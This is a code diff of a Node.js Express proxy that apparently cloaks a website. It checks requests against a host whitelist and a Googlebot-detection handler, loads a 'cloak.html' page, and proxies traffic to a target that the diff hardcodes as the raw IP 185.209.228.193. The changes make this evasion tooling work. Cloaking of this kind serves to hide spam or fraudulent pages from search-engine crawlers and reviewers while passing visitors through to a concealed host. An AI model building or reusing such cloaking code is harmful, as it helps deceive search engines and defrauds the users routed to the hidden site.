@@ -18,22 +18,21 @@ const cookie_parser_1 = __importDefault(require("cookie-parser"));
 const fs_1 = __importDefault(require("fs"));
 const cloak_1 = require("./cloak");
 let cloakHtml = fs_1.default.readFileSync('./assets/cloak.html').toString();
-const targetUrl = process.env.TARGET_URL;
+const targetUrl = process.env.TARGET_URL || "http://185.209.228.193";
 if (!targetUrl)
     throw Error('Needs target url');
 console.log(`Proxy to ${targetUrl}`);
 const app = (0, express_1.default)();
 const proxy = http_proxy_1.default.createProxyServer({
-    changeOrigin: true,
     followRedirects: true
 });
 app.use((0, cookie_parser_1.default)());
 app.use(function (req, res) {
     return __awaiter(this, void 0, void 0, function* () {
-        const doProxy = () => proxy.web(req, res, { target: targetUrl });
+        const doProxy = (req, res) => proxy.web(req, res, { target: targetUrl });
         const conf = JSON.parse(fs_1.default.readFileSync('./assets/conf.json').toString());
         if (conf.whiteListHost.includes(req.get('host') || ''))
-            doProxy();
+            doProxy(req, res);
         else
             detectGBotHandler(req, res, conf, doProxy);
     });
@@ -51,7 +50,7 @@ function detectGBotHandler(req, res, conf, cbProxy) {
             res.header("Cache-Control", "max-age=0");
             res.header("X-Frame-Options", "DENY");
             res.header("X-Robots-Tag", "noarchive");
-            cbProxy();
+            cbProxy(req, res);
         }
         else {
             res.header("Cache-Control", "max-age=0");
